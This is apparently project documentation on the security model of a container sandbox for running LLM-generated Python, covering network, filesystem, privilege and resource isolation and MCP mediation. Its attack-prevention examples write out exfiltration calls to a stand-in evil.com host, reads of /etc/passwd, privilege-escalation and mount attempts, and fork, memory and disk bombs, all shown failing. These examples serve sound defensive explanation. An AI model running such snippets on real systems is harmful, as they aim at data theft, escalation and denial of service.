# 9. Security Model

This document explains the security architecture that makes it safe to run LLM-generated code.

## 🎯 The Threat Model

**The Problem:** An LLM generates Python code. We want to run it, but:
- The code might be malicious (intentionally or accidentally)
- The code might try to access sensitive data
- The code might try to escape to the host system
- The code might try to use excessive resources

**The Solution:** Defense in depth with multiple isolation layers.

---

## 🏰 Defense Layers

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                          SECURITY LAYERS                                     │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│   ┌────────────────────────────────────────────────────────────────────────┐│
│   │  LAYER 1: CONTAINER ISOLATION                                          ││
│   │                                                                        ││
│   │  • Separate namespace from host                                        ││
│   │  • Own process tree, network stack, mount points                       ││
│   │  • Cannot see or interact with host processes                          ││
│   └────────────────────────────────────────────────────────────────────────┘│
│                                                                              │
│   ┌────────────────────────────────────────────────────────────────────────┐│
│   │  LAYER 2: NETWORK ISOLATION                                            ││
│   │                                                                        ││
│   │  • --network none: No network interfaces                               ││
│   │  • Cannot make HTTP requests                                           ││
│   │  • Cannot connect to databases                                         ││
│   │  • Cannot exfiltrate data                                              ││
│   └────────────────────────────────────────────────────────────────────────┘│
│                                                                              │
│   ┌────────────────────────────────────────────────────────────────────────┐│
│   │  LAYER 3: FILESYSTEM ISOLATION                                         ││
│   │                                                                        ││
│   │  • --read-only: Cannot write to container filesystem                   ││
│   │  • Only /tmp and /workspace are writable (tmpfs)                       ││
│   │  • Cannot persist malicious files                                      ││
│   │  • Cannot modify system binaries                                       ││
│   └────────────────────────────────────────────────────────────────────────┘│
│                                                                              │
│   ┌────────────────────────────────────────────────────────────────────────┐│
│   │  LAYER 4: PRIVILEGE DROPPING                                           ││
│   │                                                                        ││
│   │  • --cap-drop ALL: No Linux capabilities                               ││
│   │  • --security-opt no-new-privileges: Cannot escalate                   ││
│   │  • --user 65534:65534: Runs as "nobody"                                ││
│   │  • Cannot become root                                                  ││
│   └────────────────────────────────────────────────────────────────────────┘│
│                                                                              │
│   ┌────────────────────────────────────────────────────────────────────────┐│
│   │  LAYER 5: RESOURCE LIMITS                                              ││
│   │                                                                        ││
│   │  • --memory 512m: Max 512MB RAM                                        ││
│   │  • --pids-limit 128: Max 128 processes                                 ││
│   │  • --cpus: CPU quota (optional)                                        ││
│   │  • Timeout enforcement                                                 ││
│   └────────────────────────────────────────────────────────────────────────┘│
│                                                                              │
│   ┌────────────────────────────────────────────────────────────────────────┐│
│   │  LAYER 6: MCP MEDIATION                                                ││
│   │                                                                        ││
│   │  • All external calls go through host                                  ││
│   │  • Server allowlist enforced                                           ││
│   │  • Audit trail possible                                                ││
│   └────────────────────────────────────────────────────────────────────────┘│
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 🐳 Container Command

The full container command with all security flags:

```bash
podman run \
    --rm \                              # Remove container after exit
    --interactive \                     # Keep stdin open
    --network none \                    # No network access
    --read-only \                       # Read-only filesystem
    --pids-limit 128 \                  # Process limit
    --memory 512m \                     # Memory limit
    --tmpfs /tmp:rw,noexec,nosuid,nodev,size=64m \     # Writable /tmp
    --tmpfs /workspace:rw,noexec,nosuid,nodev,size=128m \  # Writable workspace
    --workdir /workspace \              # Set working directory
    --env HOME=/workspace \             # Set HOME
    --env PYTHONUNBUFFERED=1 \          # Unbuffered output
    --security-opt no-new-privileges \  # Cannot escalate privileges
    --cap-drop ALL \                    # Drop all capabilities
    --user 65534:65534 \                # Run as nobody
    python:3.14-slim \                  # Base image
    python3 -u /ipc/entrypoint.py       # Run script
```

---

## 🔐 Security Features Explained

### 1. Rootless Containers

The container runtime (podman/docker) runs **without root privileges**:

```
┌─────────────────────────────────────────────────────────────────────────┐
│                   TRADITIONAL (ROOT) VS ROOTLESS                         │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│   TRADITIONAL DOCKER             │    ROOTLESS PODMAN/DOCKER             │
│   ─────────────────────          │    ──────────────────────             │
│   Docker daemon = root           │    No daemon OR unprivileged          │
│   Container = root (by default)  │    Container = user namespace         │
│   Escape = full root access      │    Escape = still unprivileged        │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

Even if an attacker escapes the container, they only have the privileges of the user who started the bridge.

### 2. Network Isolation (`--network none`)

```python
# This fails in the sandbox:
import requests
requests.get("https://evil.com")
# OSError: [Errno 101] Network is unreachable

# Even raw sockets fail:
import socket
socket.socket().connect(("evil.com", 80))
# OSError: [Errno 101] Network is unreachable
```

**Why this matters:**
- Cannot download malware
- Cannot exfiltrate data
- Cannot attack other systems
- Cannot participate in botnets

**How external access works:** Through MCP server proxies that run on the host.

### 3. Read-Only Filesystem (`--read-only`)

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    FILESYSTEM ACCESS IN CONTAINER                        │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│   PATH                 │  ACCESS    │  NOTES                             │
│   ─────────────────────┼────────────┼─────────────────────────────────── │
│   /                    │  Read-only │  Base filesystem                   │
│   /bin, /usr, /lib     │  Read-only │  System binaries                   │
│   /etc                 │  Read-only │  Configuration                     │
│   /tmp                 │  Read/Write│  64MB tmpfs, noexec                │
│   /workspace           │  Read/Write│  128MB tmpfs, noexec               │
│   /ipc                 │  Read/Write│  Mounted from host (entrypoint)    │
│   /projects/memory     │  Read/Write│  Persistent memory (~/MCPs/memory) │
│   /projects/user_tools.py│  Read/Write│  Saved functions (~/MCPs/user_tools.py)│
│   /projects/execution  │  Read/Write│  Execution artifacts (LRU)         │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

**noexec flag:** Even in writable directories, you cannot execute binaries.

### 4. Capability Dropping (`--cap-drop ALL`)

Linux capabilities grant specific privileges. We drop ALL of them:

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    DROPPED CAPABILITIES                                  │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│   CAP_NET_ADMIN        │  Cannot configure network                       │
│   CAP_NET_RAW          │  Cannot use raw sockets                         │
│   CAP_SYS_ADMIN        │  Cannot mount filesystems, etc.                 │
│   CAP_SYS_PTRACE       │  Cannot debug other processes                   │
│   CAP_CHOWN            │  Cannot change file ownership                   │
│   CAP_DAC_OVERRIDE     │  Cannot bypass file permissions                 │
│   CAP_SETUID           │  Cannot change user ID                          │
│   CAP_SETGID           │  Cannot change group ID                         │
│   (... and all others)                                                   │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### 5. No New Privileges (`--security-opt no-new-privileges`)

Even if a setuid binary exists, it won't gain privileges:

```python
# Normally, ping might be setuid root
# With no-new-privileges, it still runs as nobody
os.system("ping -c 1 google.com")
# Fails: Operation not permitted (and no network anyway)
```

### 6. User Namespace (`--user 65534:65534`)

The code runs as user 65534 (typically "nobody"):

```python
import os
print(os.getuid())  # 65534
print(os.getgid())  # 65534
```

This user has minimal permissions both inside and outside the container.

### 7. Resource Limits

**Memory limit (`--memory 512m`):**
```python
# This will be killed:
data = []
while True:
    data.append("x" * 10_000_000)  # Allocate 10MB chunks
# Killed after ~50 allocations
```

**PID limit (`--pids-limit 128`):**
```python
# This fails after 128 processes:
import subprocess
for i in range(200):
    subprocess.Popen(["sleep", "100"])
# OSError: [Errno 11] Resource temporarily unavailable
```

**Timeout:**
```python
# Long-running code is killed:
import time
while True:
    time.sleep(1)
# Killed after timeout (default 30s)
```

---

## 🔄 MCP Mediation

All external access goes through the host:

```
┌─────────────────────────────────────────────────────────────────────────┐
│                     MCP MEDIATION FLOW                                   │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│   SANDBOX                      HOST                        EXTERNAL      │
│   ───────                      ────                        ────────      │
│                                                                          │
│   Code wants weather    ──►   Bridge validates    ──►    API called      │
│                               server is allowed            (network)     │
│                               tool exists                                │
│                                                                          │
│   Result returned       ◄──   Bridge returns       ◄──    Data received  │
│                               filtered result                            │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

**Benefits:**
- Only pre-configured servers are accessible
- All calls can be logged/audited
- Rate limiting can be added
- Sensitive data can be filtered

---

## 🚫 Attack Prevention Examples

### Attempt: File Exfiltration

```python
# Try to read host files
with open("/etc/passwd") as f:
    data = f.read()
# Sees container's /etc/passwd, not host's

# Try to escape via /proc
os.readlink("/proc/1/root")
# Permission denied or container's root
```

### Attempt: Network Exfiltration

```python
# Try HTTP
import urllib.request
urllib.request.urlopen("https://evil.com/steal?data=secret")
# Network is unreachable

# Try DNS
import socket
socket.gethostbyname("evil.com")
# Name or service not known
```

### Attempt: Privilege Escalation

```python
# Try to become root
os.setuid(0)
# Operation not permitted

# Try to use sudo
os.system("sudo -s")
# Command not found / Operation not permitted
```

### Attempt: Container Escape

```python
# Try to access host processes
os.listdir("/proc")
# Only sees container processes

# Try to mount host filesystem  
os.system("mount /dev/sda1 /mnt")
# Permission denied (no CAP_SYS_ADMIN)

# Try to use docker socket
os.path.exists("/var/run/docker.sock")
# False (not mounted)
```

### Attempt: Resource Exhaustion

```python
# Fork bomb
import os
while True:
    os.fork()
# Hits PID limit, fails

# Memory bomb
x = " " * (10 ** 10)
# Container killed (OOM)

# Disk bomb
with open("/tmp/huge", "wb") as f:
    f.write(b"x" * 10**9)
# Hits tmpfs size limit
```

---

## ⚙️ Configurable Security

| Variable | Purpose | Default |
|----------|---------|---------|
| `MCP_BRIDGE_MEMORY` | Memory limit | `512m` |
| `MCP_BRIDGE_PIDS` | Process limit | `128` |
| `MCP_BRIDGE_CPUS` | CPU quota | (host default) |
| `MCP_BRIDGE_TIMEOUT` | Execution timeout | `30` |
| `MCP_BRIDGE_MAX_TIMEOUT` | Max timeout | `120` |
| `MCP_BRIDGE_CONTAINER_USER` | UID:GID | `65534:65534` |

---

## 📊 Security Comparison

| Feature | This Bridge | Node.js VM | No Isolation |
|---------|-------------|------------|--------------|
| Process isolation | ✅ Container | ⚠️ Same process | ❌ None |
| Network isolation | ✅ --network none | ❌ Full access | ❌ Full access |
| Filesystem isolation | ✅ Read-only | ⚠️ Partial | ❌ Full access |
| Resource limits | ✅ Memory/PID/CPU | ⚠️ Limited | ❌ None |
| Privilege isolation | ✅ No capabilities | ❌ Same user | ❌ Same user |
| Escape difficulty | Hard | Medium | N/A |

---

## ⚠️ Known Limitations

1. **Timing attacks:** Code can measure time, potentially leaking info
2. **Resource probing:** Code can detect resource limits
3. **Host information:** Some host info visible via `/proc/cpuinfo` etc.
4. **Side channels:** CPU cache timing attacks possible in theory

These are generally acceptable risks for LLM code execution.

---

## 🔍 Security Checklist

When deploying:

- [ ] Use rootless container runtime
- [ ] Keep container images updated
- [ ] Limit which MCP servers are accessible
- [ ] Set appropriate timeouts
- [ ] Monitor resource usage
- [ ] Log all tool calls
- [ ] Review LLM output periodically

---

## Next Steps

→ [Configuration](10-configuration.md) - All configuration options
